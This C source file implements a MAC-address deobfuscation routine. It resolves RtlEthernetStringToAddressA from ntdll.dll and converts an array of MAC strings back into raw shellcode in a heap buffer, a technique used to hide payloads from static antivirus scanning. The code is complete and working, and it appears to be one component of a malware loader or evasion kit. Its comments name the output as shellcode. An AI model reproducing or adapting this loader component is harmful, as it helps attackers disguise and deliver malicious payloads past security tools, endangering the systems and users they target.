#include "encoders.h"


typedef NTSTATUS (NTAPI* fnRtlEthernetStringToAddressA)(
        PCSTR                   S,
        PCSTR*                  Terminator,
        PVOID                   Addr
);


BOOL MacDeobfuscation(IN CHAR* MacArray[], IN SIZE_T NmbrOfElements, OUT PBYTE * ppDAddress, OUT SIZE_T * pDSize) {
        PBYTE           pBuffer         = NULL, TmpBuffer       = NULL;
        SIZE_T          sBuffSize       = 0;
        PCSTR           Terminator      = NULL;
        NTSTATUS        STATUS          = STATUS_SUCCESS;
        
        // getting fnRtlEthernetStringToAddressA  address from ntdll.dll
#ifdef UNICODE
        fnRtlEthernetStringToAddressA  pRtlEthernetStringToAddressA = (fnRtlEthernetStringToAddressA)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlEthernetStringToAddressA");
#else
        fnRtlEthernetStringToAddressA  pRtlEthernetStringToAddressA = (fnRtlEthernetStringToAddressA)GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlEthernetStringToAddressA");
#endif
        if (pRtlEthernetStringToAddressA  == NULL) {
                DebugPrint("[!] GetProcAddress Failed With Error : %d \n", GetLastError());
                return FALSE;
        }
        // getting the real size of the shellcode (number of elements * 6 => original shellcode size)
        sBuffSize = NmbrOfElements * 6;
        // allocating mem, that will hold the deobfuscated shellcode
        pBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), 0, sBuffSize);
        if (pBuffer == NULL) {
                DebugPrint("[!] HeapAlloc Failed With Error : %d \n", GetLastError());
                return FALSE;
        }
        // setting TmpBuffer to be equal to pBuffer
        TmpBuffer = pBuffer;
        
        
        // loop through all the addresses saved in MacArray
        for (int i = 0; i < NmbrOfElements; i++) {
                // MacArray[i] is a single mac address from the array MacArray
                if ((STATUS = pRtlEthernetStringToAddressA(MacArray[i], &Terminator, TmpBuffer)) != 0x0) {
                        // if failed ...
                        DebugPrint("[!] RtlEthernetStringToAddressA  Failed At [%s] With Error 0x%0.8X\n", MacArray[i], STATUS);
                        return FALSE;
                }
                
                // tmp buffer will be used to point to where to write next (in the newly allocated memory)
                TmpBuffer = (PBYTE)(TmpBuffer + 6);
        }
        
        *ppDAddress = pBuffer;
        *pDSize = sBuffSize;
        return TRUE;
}